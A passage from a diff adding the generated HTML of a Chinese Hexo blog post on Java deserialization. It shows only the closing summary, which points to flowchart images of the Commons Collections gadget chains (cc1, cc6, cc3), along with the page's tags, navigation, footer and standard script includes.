&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p><img src="/imgss/java155.png" alt=""></p>
+<h3 id="xiao-jie-liu-cheng-tu" id="小结-流程图">小结(流程图)</h3>
+<p>整理下cc链 学习到现在的一个流程图。<br>
+包含 cc1两条 cc6 cc3。</p>
+<p><img src="/imgss/java157.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97/" rel="tag"># java安全系列</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/10/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6/" rel="prev" title="'Java反序列化-cc6'">
+                  <i class="fa fa-chevron-left"></i> 'Java反序列化-cc6'
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zer0_c|imb</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
